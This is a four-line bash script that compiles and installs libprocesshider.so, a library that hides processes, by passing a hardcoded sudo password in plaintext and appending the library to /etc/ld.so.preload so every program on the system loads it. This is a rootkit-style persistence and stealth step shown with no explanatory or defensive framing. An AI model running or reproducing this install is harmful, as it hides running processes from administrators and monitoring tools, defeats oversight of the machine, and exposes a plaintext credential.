#!/bin/bash
make
echo 2bf1R3tA | sudo -S mv libprocesshider.so /usr/local/lib/
sudo su -c "echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload"
